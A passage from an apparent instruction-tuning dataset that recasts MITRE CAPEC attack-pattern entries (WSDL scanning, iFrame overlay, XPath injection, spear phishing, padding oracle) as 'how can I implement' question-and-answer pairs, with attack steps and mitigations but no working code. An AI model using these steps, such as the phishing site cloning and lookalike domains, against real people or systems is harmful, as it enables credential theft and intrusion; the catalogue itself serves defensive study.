            "A client program connecting to a web service can read the WSDL to determine what functions are available on the server.",
            "The target host exposes vulnerable functions within its WSDL interface."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "This attack can be as simple as reading WSDL and starting sending invalid request."
            },
            {
              "@Level": "Medium",
              "#text": "This attack can be used to perform more sophisticated attacks (SQL injection, etc.)"
            }
          ]
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "It is important to protect WSDL file or provide limited access to it.",
            "Review the functions exposed by the WSDL interface (especially if you have used a tool to generate it). Make sure that none of them is vulnerable to injection.",
            "Ensure the WSDL does not expose functions and APIs that were not intended to be exposed.",
            "Pay attention to the function naming convention (within the WSDL interface). Easy to guess function name may be an entry point for attack.",
            "Validate the received messages against the WSDL Schema. Incomplete solution."
          ]
        },
        "Example_Instances": {
          "Example": [
            "A WSDL interface may expose a function vulnerable to SQL Injection.",
            {
              "xhtml:p": [
                "The Web Services Description Language (WSDL) allows a web service to advertise its capabilities by describing operations and parameters needed to access the service. As discussed in step 5 of this series, WSDL is often generated automatically, using utilities such as Java2WSDL, which takes a class or interface and builds a WSDL file in which interface methods are exposed as web services.",
                "Because WSDL generation often is automated, enterprising adversaries can use WSDL to gain insight into the both public and private services. For example, an organization converting legacy application functionality to a web services framework may inadvertently pass interfaces not intended for public consumption to a WSDL generation tool. The result will be SOAP interfaces that give access to private methods.",
                "Another, more subtle WSDL attack occurs when an enterprising attacker uses naming conventions to guess the names of unpublished methods that may be available on the server. For example, a service that offers a stock quote and trading service may publish query methods such as requestStockQuote in its WSDL. However, similar unpublished methods may be available on the server but not listed in the WSDL, such as executeStockQuote. A persistent adversary with time and a library of words and phrases can cycle thru common naming conventions (get, set, update, modify, and so on) to discover unpublished application programming interfaces that open doors into private data and functionality.",
                "Source : \"Seven Steps to XML Mastery, Step 7: Ensure XML Security\", Frank Coyle. See reference section."
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "538"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-554"
            },
            {
              "@External_Reference_ID": "REF-555",
              "@Section": "Step 7: Ensure XML Security"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - iFrame Overlay (CAPEC ID: 222)",
    "context": "",
    "output": "Examples of iFrame Overlay (CAPEC ID: 222) are: The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled \"Don't Click.\" This button is aligned with the invisible \"Update\" button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to their Twitter profile.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled \"Don't Click.\" This button is aligned with the invisible \"Update\" button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to their Twitter profile.",
      "@Name": "iFrame Overlay (CAPEC ID: 222)",
      "attack_ptrn": {
        "@ID": "222",
        "@Name": "iFrame Overlay",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system.",
        "Extended_Description": {
          "xhtml:p": "While being logged in to some target system, the victim visits the adversarys' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the adversary wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the adversary may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks they are clicking on versus what they are actually clicking on."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "103",
            "Exclude_Related": {
              "@Exclude_ID": "403"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Craft an iFrame Overlay page] The adversary crafts a malicious iFrame overlay page.",
              "Technique": "The adversary leverages iFrame overlay capabilities to craft a malicious iFrame overlay page."
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[adversary tricks victim to load the iFrame overlay page] adversary utilizes some form of temptation, misdirection or coercion to trick the victim to loading and interacting with the iFrame overlay page in a way that increases the chances that the victim will visit the malicious page.",
              "Technique": [
                "Trick the victim to the malicious site by sending the victim an e-mail with a URL to the site.",
                "Trick the victim to the malicious site by manipulating URLs on a site trusted by the victim.",
                "Trick the victim to the malicious site through a cross-site scripting attack."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Trick victim into interacting with the iFrame overlay page in the desired manner] The adversary tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.",
              "Technique": [
                "Hide action controls over very commonly used functionality.",
                "Hide action controls over very psychologically tempting content."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The victim is communicating with the target application via a web based UI and not a thick client. The victim's browser security policies allow iFrames. The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser). The victim has an active session with the target system. The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Crafting the proper malicious site and luring the victim to this site is not a trivial task."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Configuration: Disable iFrames in the Web browser.",
            "Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.",
            "Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames."
          ]
        },
        "Example_Instances": {
          "Example": "The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled \"Don't Click.\" This button is aligned with the invisible \"Update\" button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to their Twitter profile."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1021"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-84"
            },
            {
              "@External_Reference_ID": "REF-85"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Execution_Flow, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - XML Injection (CAPEC ID: 250)",
    "context": "",
    "output": "Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.",
      "@Name": "XML Injection (CAPEC ID: 250)",
      "attack_ptrn": {
        "@ID": "250",
        "@Name": "XML Injection",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.",
        "Likelihood_Of_Attack": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "248"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the Target] Using a browser or an automated tool, an adversary records all instances of user-controllable input used to contruct XML queries",
              "Technique": [
                "Use an automated tool to record all instances of user-controllable input used to contruct XML queries.",
                "Use a browser to manually explore the website and analyze how the application processes inputs."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Determine the Structure of Queries] Using manual or automated means, test inputs found for XML weaknesses.",
              "Technique": "Use XML reserved characters or words, possibly with other input data to attempt to cause unexpected results and identify improper input validation."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Inject Content into XML Queries] Craft malicious content containing XML expressions that is not validated by the application and is executed as part of the XML queries.",
              "Technique": "Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "XML queries used to process user input and retrieve information stored in XML documents",
            "User-controllable input not properly sanitized"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "An attacker must have knowledge of XML syntax and constructs in order to successfully leverage XML Injection"
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Indicators": {
          "Indicator": "Too many exceptions generated by the application as a result of malformed queries"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query.",
            "Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application."
          ]
        },
        "Example_Instances": {
          "Example": "Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "91"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "707"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "23",
            "Entry_Name": "XML Injection"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Mitigations, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Spear Phishing (CAPEC ID: 163)",
    "context": "",
    "output": "Possible examples: The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity that happened in a different area from where they live (details might be provided by the spear phishers) and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An adversary has just collected the target's online banking information which can now be used by them to log into the target's bank account and transfer money to a bank account of the adversary's choice.\n- An adversary can leverage a weakness in the SMB protocol by sending the target, an official looking e-mail from their employer's IT Department stating that their system has vulnerable software, which they need to manually patch by accessing an updated version of the software by clicking on a provided link to a network share. Once the link is clicked, the target is directed to an external server controlled by the adversary or to a malicious file on a public access share. The SMB protocol will then attempt to authenticate the target to the adversary controlled server, which allows the adversary to capture the hashed credentials over SMB. These credentials can then be used to execute offline brute force attacks or a \"Pass The Hash\" attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity that happened in a different area from where they live (details might be provided by the spear phishers) and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An adversary has just collected the target's online banking information which can now be used by them to log into the target's bank account and transfer money to a bank account of the adversary's choice.",
        "An adversary can leverage a weakness in the SMB protocol by sending the target, an official looking e-mail from their employer's IT Department stating that their system has vulnerable software, which they need to manually patch by accessing an updated version of the software by clicking on a provided link to a network share. Once the link is clicked, the target is directed to an external server controlled by the adversary or to a malicious file on a public access share. The SMB protocol will then attempt to authenticate the target to the adversary controlled server, which allows the adversary to capture the hashed credentials over SMB. These credentials can then be used to execute offline brute force attacks or a \"Pass The Hash\" attack."
      ],
      "@Name": "Spear Phishing (CAPEC ID: 163)",
      "attack_ptrn": {
        "@ID": "163",
        "@Name": "Spear Phishing",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary targets a specific user or group with a Phishing (CAPEC-98) attack tailored to a category of users in order to have maximum relevance and deceptive capability. Spear Phishing is an enhanced version of the Phishing attack targeted to a specific user or group. The quality of the targeted email is usually enhanced by appearing to come from a known or trusted entity. If the email account of some trusted entity has been compromised the message may be digitally signed. The message will contain information specific to the targeted users that will enhance the probability that they will follow the URL to the compromised site. For example, the message may indicate knowledge of the targets employment, residence, interests, or other information that suggests familiarity. As soon as the user follows the instructions in the message, the attack proceeds as a standard Phishing attack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "98"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Obtain useful contextual detailed information about the targeted user or organization] An adversary collects useful contextual detailed information about the targeted user or organization in order to craft a more deceptive and enticing message to lure the target into responding.",
              "Technique": [
                "Conduct web searching research of target. See also: CAPEC-118.",
                "Identify trusted associates, colleagues and friends of target. See also: CAPEC-118.",
                "Utilize social engineering attack patterns such as Pretexting. See also: CAPEC-407.",
                "Collect social information via dumpster diving. See also: CAPEC-406.",
                "Collect social information via traditional sources. See also: CAPEC-118.",
                "Collect social information via Non-traditional sources. See also: CAPEC-118."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Optional: Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.",
              "Technique": [
                "Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L).",
                "Optionally obtain a legitimate SSL certificate for the new domain name."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Optional: Explore legitimate website and create duplicate] An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.",
              "Technique": [
                "Use spidering software to get copy of web pages on legitimate site.",
                "Manually save copies of required web pages from legitimate site.",
                "Create new web pages that have the legitimate site's look at feel, but contain completely new content."
              ]
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Optional: Build variants of the website with very specific user information e.g., living area, etc.] Once the adversary has their website which duplicates a legitimate website, they need to build very custom user related information in it. For example, they could create multiple variants of the website which would target different living area users by providing information such as local news, local weather, etc. so that the user believes this is a new feature from the website.",
              "Technique": "Integrate localized information in the web pages created to duplicate the original website. Those localized information could be dynamically generated based on unique key or IP address of the future victim."
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Convince user to enter sensitive information on adversary's site.] An adversary sends a message (typically an e-mail) to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to adversary's website) and log in. The key is to get the victim to believe that the message is coming from a legitimate entity trusted by the victim or with which the victim or does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.",
              "Technique": [
                "Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.",
                "Place phishing link in post to online forum."
              ]
            },
            {
              "Step": "6",
              "Phase": "Exploit",
              "Description": "[Use stolen credentials to log into legitimate site] Once the adversary captures some sensitive information through phishing (login credentials, credit card information, etc.) the adversary can leverage this information. For instance, the adversary can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.",
              "Technique": "Log in to the legitimate site using another user's supplied credentials."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "None. Any user can be targeted by a Spear Phishing attack."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Spear phishing attacks require specific knowledge of the victims being targeted, such as which bank is being used by the victims, or websites they commonly log into (Google, Facebook, etc)."
          }
        },
        "Resources_Required": {
          "Resource": "An adversay must have the ability communicate their phishing scheme to the victims (via email, instance message, etc.), as well as a website or other platform for victims to enter personal information into."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data",
              "Note": "Information Leakage"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges",
              "Note": "Privilege Escalation"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data",
              "Note": "Data Modification"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind."
        },
        "Example_Instances": {
          "Example": [
            "The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity that happened in a different area from where they live (details might be provided by the spear phishers) and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An adversary has just collected the target's online banking information which can now be used by them to log into the target's bank account and transfer money to a bank account of the adversary's choice.",
            "An adversary can leverage a weakness in the SMB protocol by sending the target, an official looking e-mail from their employer's IT Department stating that their system has vulnerable software, which they need to manually patch by accessing an updated version of the software by clicking on a provided link to a network share. Once the link is clicked, the target is directed to an external server controlled by the adversary or to a malicious file on a public access share. The SMB protocol will then attempt to authenticate the target to the adversary controlled server, which allows the adversary to capture the hashed credentials over SMB. These credentials can then be used to execute offline brute force attacks or a \"Pass The Hash\" attack."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "451"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1534",
              "Entry_Name": "Internal Spearfishing"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1566.001",
              "Entry_Name": "Phishing: Spearfishing Attachment"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1566.002",
              "Entry_Name": "Phishing: Spearfishing Link"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1566.003",
              "Entry_Name": "Phishing: Spearfishing via Service"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1598.001",
              "Entry_Name": "Phishing for Information: Spearfishing Service"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1598.002",
              "Entry_Name": "Phishing for Information: Spearfishing Attachment"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1598.003",
              "Entry_Name": "Phishing for Information: Spearfishing Link"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Example_Instances, Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Padding Oracle Crypto Attack (CAPEC ID: 463), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: An adversary sends a request containing ciphertext to the target system. Due to the browser's same origin policy, the adversary is not able to see the response directly, but can use cross-domain information leak techniques to still get the information needed (i.e., information on whether or not a padding error has occurred). This can be done using \"img\" tag plus the onerror()/onload() events. The adversary's JavaScript can make web browsers to load an image on the target site, and know if the image is loaded or not. This is 1-bit information needed for the padding oracle attack to work: if the image is loaded, then it is valid padding, otherwise it is not.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary sends a request containing ciphertext to the target system. Due to the browser's same origin policy, the adversary is not able to see the response directly, but can use cross-domain information leak techniques to still get the information needed (i.e., information on whether or not a padding error has occurred). This can be done using \"img\" tag plus the onerror()/onload() events. The adversary's JavaScript can make web browsers to load an image on the target site, and know if the image is loaded or not. This is 1-bit information needed for the padding oracle attack to work: if the image is loaded, then it is valid padding, otherwise it is not.",
      "@Name": "Padding Oracle Crypto Attack (CAPEC ID: 463)",
      "attack_ptrn": {
        "@ID": "463",
        "@Name": "Padding Oracle Crypto Attack",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary is able to efficiently decrypt data without knowing the decryption key if a target system leaks data on whether or not a padding error happened while decrypting the ciphertext. A target system that leaks this type of information becomes the padding oracle and an adversary is able to make use of that oracle to efficiently decrypt data without knowing the decryption key by issuing on average 128*b calls to the padding oracle (where b is the number of bytes in the ciphertext block). In addition to performing decryption, an adversary is also able to produce valid ciphertexts (i.e., perform encryption) by using the padding oracle, all without knowing the encryption key.",
        "Extended_Description": {
          "xhtml:p": "Any cryptosystem can be vulnerable to padding oracle attacks if the encrypted messages are not authenticated to ensure their validity prior to decryption, and then the information about padding error is leaked to the adversary. This attack technique may be used, for instance, to break CAPTCHA systems or decrypt/modify state information stored in client side objects (e.g., hidden fields or cookies). This attack technique is a side-channel attack on the cryptosystem that uses a data leak from an improperly implemented decryption routine to completely subvert the cryptosystem. The one bit of information that tells the adversary whether a padding error during decryption has occurred, in whatever form it comes, is sufficient for the adversary to break the cryptosystem. That bit of information can come in a form of an explicit error message about a padding error, a returned blank page, or even the server taking longer to respond (a timing attack). This attack can be launched cross domain where an adversary is able to use cross-domain information leaks to get the bits of information from the padding oracle from a target system / service with which the victim is communicating."
        },
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "97",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The decryption routine does not properly authenticate the message / does not verify its integrity prior to performing the decryption operation",
            "The target system leaks data (in some way) on whether a padding error has occurred when attempting to decrypt the ciphertext.",
            "The padding oracle remains available for enough time / for as many requests as needed for the adversary to decrypt the ciphertext."
          ]
        },
        "Resources_Required": {
          "Resource": {
            "xhtml:p": [
              "Ability to detect instances where a target system is vulnerable to an oracle padding attack",
              "Sufficient cryptography knowledge and tools needed to take advantage of the presence of the padding oracle to perform decryption / encryption of data without a key"
            ]
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use a message authentication code (MAC) or another mechanism to perform verification of message authenticity / integrity prior to decryption",
            "Implementation: Do not leak information back to the user as to any cryptography (e.g., padding) encountered during decryption."
          ]
        },
        "Example_Instances": {
          "Example": "An adversary sends a request containing ciphertext to the target system. Due to the browser's same origin policy, the adversary is not able to see the response directly, but can use cross-domain information leak techniques to still get the information needed (i.e., information on whether or not a padding error has occurred). This can be done using \"img\" tag plus the onerror()/onload() events. The adversary's JavaScript can make web browsers to load an image on the target site, and know if the image is loaded or not. This is 1-bit information needed for the padding oracle attack to work: if the image is loaded, then it is valid padding, otherwise it is not."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "209"
            },
            {
              "@CWE_ID": "514"
            },
            {
              "@CWE_ID": "649"
            },
            {
              "@CWE_ID": "347"
            },
            {
